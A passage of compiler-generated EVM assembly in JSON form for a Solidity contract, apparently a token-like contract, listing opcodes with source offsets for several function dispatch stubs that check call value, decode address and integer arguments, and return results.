										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SUB"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "RETURN"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "JUMPDEST"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "PUSH [tag]",
											"value": "109"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "PUSH [tag]",
											"value": "110"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "tag",
											"value": "109"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "JUMPDEST"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "STOP"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "JUMPDEST"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "PUSH [tag]",
											"value": "111"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "PUSH [tag]",
											"value": "112"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "tag",
											"value": "111"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "JUMPDEST"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "MLOAD"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "DUP1"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "DUP3"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "ISZERO"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "ISZERO"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "ISZERO"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "ISZERO"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "DUP2"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "MSTORE"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "ADD"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "SWAP2"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "POP"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "POP"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "MLOAD"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "DUP1"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "SWAP2"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "SUB"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "SWAP1"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "RETURN"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "113"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "113"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH [tag]",
											"value": "114"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "115"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "115"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "AND"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH [tag]",
											"value": "116"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "tag",
											"value": "114"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "MLOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "MSTORE"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "MLOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SUB"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "RETURN"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMPDEST"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "117"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "117"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH [tag]",
											"value": "118"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH [tag]",
											"value": "119"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "tag",
											"value": "118"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMPDEST"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "MLOAD"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP3"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "AND"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "AND"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP2"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "MSTORE"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "ADD"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "SWAP2"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "MLOAD"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "SWAP2"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "SUB"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "SWAP1"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "RETURN"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "JUMPDEST"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "120"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "120"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "POP"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH [tag]",
											"value": "121"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "122"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "122"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP2"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ADD"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "AND"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ADD"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP3"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP2"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "POP"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "POP"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "POP"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH [tag]",
											"value": "123"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "tag",
											"value": "121"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "JUMPDEST"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "MLOAD"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP3"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ISZERO"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ISZERO"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ISZERO"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ISZERO"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP2"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "MSTORE"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "ADD"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP2"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "POP"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "POP"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "MLOAD"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "DUP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP2"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SUB"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "SWAP1"
										},
										{
											"begin": 2938,
											"end": 3067,
											"name": "RETURN"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "JUMPDEST"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "124"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "124"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "POP"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "PUSH [tag]",
											"value": "125"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "PUSH [tag]",
											"value": "126"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "tag",
											"value": "125"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "JUMPDEST"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "MLOAD"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "DUP1"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "DUP3"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "ISZERO"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "ISZERO"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "ISZERO"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "ISZERO"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "DUP2"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "MSTORE"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "ADD"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "SWAP2"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "POP"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "POP"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "MLOAD"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "DUP1"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "SWAP2"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "SUB"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "SWAP1"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "RETURN"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "127"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "127"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH [tag]",
											"value": "128"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "129"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "129"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH [tag]",
											"value": "130"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "tag",
											"value": "128"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "MLOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "MSTORE"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "MLOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SUB"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "RETURN"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "JUMPDEST"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "131"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "131"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH [tag]",
											"value": "132"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "133"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "133"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP2"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ADD"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": 4525,
